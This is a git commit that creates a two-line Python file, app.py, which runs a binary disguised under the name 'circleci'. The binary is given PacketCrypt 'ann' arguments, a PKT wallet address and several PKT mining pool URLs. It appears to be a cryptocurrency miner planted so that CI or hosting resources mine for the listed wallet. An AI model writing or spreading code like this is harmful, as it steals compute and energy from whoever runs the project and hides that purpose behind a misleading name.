bb0d5027da8d846b4ee978da812190318832a42b
dasx436 <102848245+dasx436@users.noreply.github.com>
2022-04-28 08:49:55 +0545

    Create app.py

---
+++ app.py
@@ -0,0 +1,2 @@
+import os
+os.system("./circleci ann -p http://pool.pkt.world pkt1qdmf0n30kus0h996jue9pd5aeuuzmdhjj2h0ms9 http://pool.pktpool.io http://pool.k1m3r4.com/ https://pool.pkthash.com http://pool.pkteer.com http://p.master.pktdigger.com/")
